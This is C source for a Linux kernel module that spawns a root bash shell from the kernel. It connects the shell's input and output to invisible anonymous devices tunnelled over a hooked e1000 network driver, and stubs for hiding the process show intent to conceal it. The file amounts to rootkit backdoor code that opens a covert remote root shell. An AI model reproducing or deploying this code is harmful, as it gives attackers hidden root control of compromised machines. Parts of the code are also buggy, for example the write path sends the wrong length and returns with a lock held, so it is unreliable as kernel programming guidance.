#include "tty_util.h"
#include "taskutil.h"
#include "e1000_hook.h"

//this qtty will interact with the e1000_hook


/*
Linux kernel list semantics are interesting. Apparently, the way this works is that an empty list is a list 
where the list->next == list. This implies that the list contains one entry at all times. Therefore,
we can assume that the first entry in the list is a dummy entry that does nothing. However, any entry after actually
contains real data. BatChest. 
*/
LIST_HEAD(commands);  //commands is the list containg the commands.
DEFINE_SPINLOCK(commands_lock); //this look prevents the whole commands structure. Take before modifying/checking commands. 


DECLARE_WAIT_QUEUE_HEAD(command_wait); //command wait queue

/*
call usermodehelper runs in a new thread, so we need to create a waitqueue and wait to populate it.

The use of this structure is important as it could be dropped from under us (In the case that the bash proc is killed). 
Therefore, this structure should ONLY be dereferenced from the process context OF THE BASH PROCESS (i.e. in syscalls)

*/

struct task_struct* bash_proc; //


/*

the command we're currently writing

We need to do this because bash reads the command one-by-one. So, we need to continually iterate through cur_command.

Eventually, when we are done with cur_command, we will pull it off 

*/
struct command* cur_command = NULL; //the command we are currently processing

#define WRITE_SIZE 1024 //how big the data payload is for each qogchamp skb. This is tunable.   

static ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){ //qtty writes in blocks of 1024 bytes so as to prevent any MTU issues

  //fragmentation into MTU sized blocks should happen here. 
   // printk(KERN_INFO "WRITING\n");
    *off = 0;
    size_t orig_size = size;

    while(size){

      size_t to_write = size < WRITE_SIZE ? size : WRITE_SIZE;
      
      char* kbuf = (char*)kmalloc(to_write, GFP_KERNEL); 

      

      if(!kbuf){
        return -ENOMEM;
      }
      if(!access_ok(buf, size)){
          return -EFAULT;
      }

      if(copy_from_user(kbuf, buf + *off, to_write)){ //copy_from_user returns 0
          return -EFAULT; //invalid buffer
      }
      if(construct_and_send_skb(kbuf, size)){ 
        return -EINVAL;
      }
      kfree(kbuf);
      *off += to_write;
      size -= to_write;
      
    }

    *off=0; //reset offset
    
    return orig_size; //all or nothing lol. Might change this. 


    
}


static int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
    //nop. We should never reach this function because we are opened as an anon inode.
    return 0;
}


static void wait_read(void){ //wait for a command to be added to

  unsigned long flags;
  unsigned int state = TASK_KILLABLE;
  DECLARE_WAITQUEUE(wait, current);
  add_wait_queue(&command_wait, &wait);
  printk(KERN_INFO "Beginning wait\n");
  
   while(1){ //wait for task to start
    set_current_state(state);
    if(signal_pending_state(state, current))
      return;
    
    spin_lock_irqsave(&commands_lock, flags);
   
    if(!list_empty(&commands)){
      spin_unlock_irqrestore(&commands_lock, flags); //don't forget to unlock before leaving!
      break;
    }
    spin_unlock_irqrestore(&commands_lock, flags); //unlock, list is not empty yet
    schedule(); //reschedule 
    
    
  }
  

  printk(KERN_INFO "Woke up\n");


  set_current_state(TASK_RUNNING);
  remove_wait_queue(&command_wait, &wait);
  
}

static ssize_t qtty_read(struct file* f, char* __user buf, size_t size, loff_t* off){ //bash calls this when reading from "stdin"
  
  unsigned long flags;

  size_t to_copy; 
  
  size_t not_copied;
  if(!access_ok(buf,size))
    return -EFAULT;
  

  

  if(!cur_command){
    BUG_ON(!cur_command && *off != 0); //it should never happen that we have a nonzero offset while cur_command is 0
    if(list_empty(&commands)){
     wait_read(); //wait until we get a new command. 
    }

    spin_lock_irqsave(&commands_lock, flags);

    if(list_empty(&commands)){ //if the list is still empty we probably got killed, return.
      return -EINTR;
    }

    
    cur_command = list_entry(commands.next, struct command, list); //get a new cur_command if there is no cur_command
    
    
    list_del(commands.next);
    spin_unlock_irqrestore(&commands_lock, flags);
  }

  //we should have a valid cur_command by now

  /*
  The logic behind this line is pretty simple. We don't want to overflow over the buffer, but we do want to read ass much as possible (up to size)

  The amount left to read is cur_command -> size - *off. However, if size < cur_command -> size - *off we want to read size.

  Once cur_command -> size - *off == 0, we know we have read everything. At that point we can free cur_command and exit out. 
  */

  to_copy = (size < cur_command -> size - *off) ? size : cur_command -> size - *off; 
  
 
  not_copied = copy_to_user(buf, cur_command -> str+*off, to_copy);

  (*off)+= (to_copy-not_copied); //increment by to_copy because we don't want to read things we've already read

  if(*off == cur_command -> size){ //if we've read everything
    kfree(cur_command -> str); //free string before command
    kfree(cur_command); //free command
    cur_command = NULL; //set command to NULL to prevent UAF
    *off = 0; //set offset to NULL. 
  }


  
  

  return to_copy - not_copied; 
  
}

const struct file_operations qtty_fops = {
    .open = qtty_open,
    .write = qtty_write,
    .read = qtty_read,  
    .owner = THIS_MODULE
};












 

DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used for waiting for bash_proc to be populated

static void hide_bash(void){
  if(!bash_proc){
    printk(KERN_INFO "bash_proc is NULL\n");
    
  }
}

static int init_func(struct subprocess_info* info, struct cred* new){ //TODO: change current working directory
  int retval; 
  struct file* qtty_file_0;
  struct file* qtty_file_1;
  struct file* qtty_file_2;
  //printk(KERN_INFO "old task ptr: 0x%lx, new task ptr: 0x%lx", (unsigned long)info->data, (unsigned long)current);
  bash_proc = current; //get task_struct
  get_task_struct(bash_proc); //increase reference counter so the task doesn't disappear from under us. I don't know how the refcount interacts with SIGKILL. TODO. 
  wake_up(&qogchamp_wait); 
 // printk("PID: %d\n", current->pid);
  
  qtty_file_0 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);
  qtty_file_1 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);
  qtty_file_2 = anon_inode_getfile("qtty", &qtty_fops, NULL, O_RDWR | O_CLOEXEC);

  //do it three times for 0,1, and 2

  retval = get_unused_fd_flags(0); //this is an important check as it reserves an fd.
  
 // printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_0); //thank FUCKING GOD this is exported. 

  retval = get_unused_fd_flags(0);
 // printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_1); //thank FUCKING GOD this is exported. 

  retval = get_unused_fd_flags(0);
  //  printk(KERN_INFO "retval: %d\n", retval);
  fd_install(retval, qtty_file_2); //thank FUCKING GOD this is exported. 


  //hide current at this point i guess.
  return 0;

}

void launch_bash(void){
  struct subprocess_info* sub_info;
  char* argv[] = {"hello world!\xA", NULL}; //for some reason these arrays need to be null terminated. 
  DECLARE_WAITQUEUE(wait, current);
  add_wait_queue(&qogchamp_wait, &wait); //add it here so we don't hit a race condition

  char* envp[] = {
    "HOME=/",
    "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
    NULL
  };
  sub_info = call_usermodehelper_setup("/bin/bash", argv, envp, GFP_KERNEL, init_func, NULL,  (void*)current);
  call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
  //it is possible that we get preempted here. However, because we added it to the wait_queue, it shouldn't matter despite umh_exec executing asynchronously
  while(1){ //wait for task to start
    set_current_state(TASK_UNINTERRUPTIBLE);
    if(bash_proc != NULL)
      break;
    schedule();
  }
  __set_current_state(TASK_RUNNING);
  printk(KERN_INFO "%llx\n",bash_proc->mm->pgd);

  remove_wait_queue(&qogchamp_wait, &wait);
}